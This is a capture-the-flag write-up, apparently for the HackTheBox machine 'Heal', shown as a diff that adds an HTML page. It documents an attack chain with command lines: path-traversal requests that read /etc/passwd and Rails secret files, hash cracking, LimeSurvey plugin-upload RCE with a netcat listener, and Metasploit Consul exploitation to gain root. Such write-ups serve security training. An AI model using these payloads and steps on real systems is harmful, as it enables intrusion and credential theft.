@@ -1,0 +1,330 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+<link rel="icon" type="image/x-icon" href="../images/favicon.ico">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB - Heal</title>
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 900px;
+            margin: 40px auto;
+            line-height: 1.6;
+            color: #222;
+        }
+
+        h1 { margin-bottom: 10px; }
+        h2 { margin-top: 40px; border-bottom: 1px solid #ddd; padding-bottom: 5px; }
+        h3 { margin-top: 25px; }
+
+        img {
+            margin: 15px 0;
+            max-width: 100%;
+            border: 1px solid #ccc;
+        }
+
+        pre {
+            background: #f4f4f4;
+            padding: 12px;
+            overflow-x: auto;
+            border-left: 4px solid #ccc;
+        }
+
+        code { font-family: Consolas, monospace; }
+
+        a { color: #0366d6; text-decoration: none; }
+        a:hover { text-decoration: underline; }
+
+        .navbar {
+            margin-bottom: 30px;
+            padding: 10px 0;
+            border-bottom: 1px solid #ccc;
+        }
+
+        .nav-item {
+            margin-right: 20px;
+            color: #0366d6;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .nav-item.active {
+            color: black;
+            text-decoration: underline;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="navbar">
+    <a href="../index.html" class="nav-item">Home</a>
+    <a href="../soc_lab_setup.html" class="nav-item">Lab Setup</a>
+    <a href="../case_1.html" class="nav-item">Case 1</a>
+    <a href="../case_2.html" class="nav-item">Case 2</a>
+        <a href="../case_3.html" class="nav-item">Case 3</a>
+    <a href="../ad_attacks_lab.html" class="nav-item">Active Directory Attacks</a>
+    <a href="../more_tools.html" class="nav-item">More Tools</a>
+    <a href="../htb.html" class="nav-item active">HackTheBox</a>
+<a href="../vulnhub.html" class="nav-item">Vulnhub</a>
+<a href="../offsec_proving_grounds.html" class="nav-item">Offsec Proving Grounds</a>
+</div>
+
+<!-- -->
+<h1>Heal (HTB – Medium)</h1>
+
+<p>
+The machine hosts multiple web applications: a Ruby on Rails API, a LimeSurvey instance, and a main site.
+Subdomain enumeration reveals an API endpoint vulnerable to LFI.  
+Rails configuration files are extracted and decrypted, providing credentials for LimeSurvey.  
+Authenticated RCE in LimeSurvey yields a shell.  
+Privilege escalation is achieved by port‑forwarding a Consul instance and exploiting it for remote execution.
+</p>
+
+<h2>Overview</h2>
+<p>
+Target: heal.htb  
+<br>Initial vector: LFI in Rails API  
+<br>Privilege escalation: Consul service exec  
+</p>
+
+<h2>Enumeration</h2>
+
+<p>Subdomain discovery:</p>
+<pre>
+$ ffuf -u http://heal.htb -H "Host: FUZZ.heal.htb" \
+  -w directory-list-2.3-medium.txt -fs 178
+-> api
+-> API
+</pre>
+
+<p>
+The API is a Ruby on Rails 7.1.4 application.
+</p>
+
+<p>Main site:</p>
+<pre>
+http://heal.htb
+</pre>
+
+<p>
+Another subdomain hosts LimeSurvey:
+</p>
+
+<pre>
+http://take-survey.heal.htb
+</pre>
+
+<p>
+The login page shows the user <code>ralph@heal.htb</code>.
+</p>
+
+<h2>Rails API – LFI</h2>
+
+<p>
+The main site has a “Resume → Export as PDF” feature.  
+Intercepting the request in Burp shows that the backend contacts:
+</p>
+
+<pre>
+api.heal.htb/export
+api.heal.htb/download
+</pre>
+
+<p>
+The <code>filename</code> parameter in <code>/download</code> is vulnerable to LFI when used with a valid auth token.
+</p>
+
+<p>Example:</p>
+<pre>
+GET /download?filename=../../../../../../etc/passwd
+</pre>
+
+<p>Users identified:</p>
+<pre>
+ralph
+ron
+administrator
+</pre>
+
+<p>
+Rails documentation suggests interesting files under <code>config/</code>.
+</p>
+
+<p>Extract master key:</p>
+<pre>
+GET /download?filename=../../config/master.key
+-> 23d5052b447ee9376809464f8c141bdf
+</pre>
+
+<p>Extract encrypted credentials:</p>
+<pre>
+GET /download?filename=../../config/credentials.yml.enc
+</pre>
+
+<h2>Decrypting Rails Credentials</h2>
+
+<p>
+Use a public decryptor:
+</p>
+
+<pre>
+$ python3 decryptor.py credentials.yml.enc master.key
+</pre>
+
+<p>Recovered:</p>
+<pre>
+secret_key_base: 7c54b3ab1c9f9d5037c8f8c856b4be85...
+</pre>
+
+<h2>Database Access</h2>
+
+<p>
+Rails stores SQLite databases under <code>storage/</code> in development mode.
+</p>
+
+<pre>
+GET /download?filename=../../storage/development.sqlite3
+</pre>
+
+<p>
+If SQLite is password‑protected, extract the user hash from Burp instead:
+</p>
+
+<pre>
+$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG
+</pre>
+
+<p>Crack with John:</p>
+<pre>
+$ john hash.txt -w /usr/share/wordlists/rockyou.txt
+-> 147258369
+</pre>
+
+<p>
+This password does not work for SSH, but works for LimeSurvey.
+</p>
+
+<h2>LimeSurvey – Authenticated RCE</h2>
+
+<p>Login:</p>
+<pre>
+http://take-survey.heal.htb/admin
+user: ralph
+pass: 147258369
+</pre>
+
+<p>
+LimeSurvey version: 6.x  
+Use an updated version of the plugin‑upload RCE exploit.
+</p>
+
+<p>
+Adjust <code>config.xml</code> and the PHP payload to match version 6.  
+Zip the files and upload through the plugin manager.
+</p>
+
+<p>Listener:</p>
+<pre>
+$ nc -nlvp 443
+</pre>
+
+<p>Exploit:</p>
+<pre>
+$ python3 exploit.py http://take-survey.heal.htb/ ralph 147258369 80
+</pre>
+
+<p>
+A shell as <code>www-data</code> is obtained.
+</p>
+
+<h2>User Pivot</h2>
+
+<p>
+Search for configuration files:
+</p>
+
+<pre>
+$ find / -iname "*config.php*" 2>/dev/null
+-> /var/www/limesurvey/application/config/config.php
+</pre>
+
+<p>Database credentials:</p>
+<pre>
+'username' => 'db_user',
+'password' => 'AdmiDi0_pA$$w0rd',
+</pre>
+
+<p>
+Try local users:
+</p>
+
+<pre>
+$ su ralph -> no
+$ su ron   -> yes
+</pre>
+
+<h2>Privilege Escalation – Consul</h2>
+
+<p>
+Enumerate ports (linpeas or manual):
+</p>
+
+<pre>
+Consul running on port 8500
+</pre>
+
+<p>Port‑forward:</p>
+<pre>
+$ ssh ron@heal.htb -L 8500:localhost:8500
+</pre>
+
+<p>
+Access:
+</p>
+
+<pre>
+http://localhost:8500
+-> Consul 1.19.2
+</pre>
+
+<p>
+Exploit Consul service execution:
+</p>
+
+<pre>
+$ msfconsole
+msf> use exploit/multi/misc/consul_service_exec
+msf> set RHOSTS 127.0.0.1
+msf> set RPORT 8500
+msf> set LHOST tun0
+msf> run
+</pre>
+
+<p>
+A Meterpreter session is obtained.  
+Spawn a shell and read <code>/root/root.txt</code>.
+</p>
+
+<h2>Conclusion</h2>
+<p>
+The machine chains several vulnerabilities: Rails LFI, encrypted credentials exposure, LimeSurvey RCE, and
+Consul service execution.  
+By extracting and decrypting Rails secrets, then exploiting LimeSurvey and Consul, full system compromise is achieved.
+</p>
+
+
+
+<!-- -->
+
+</body>
+</html>
+
+
+
+
+
+
+
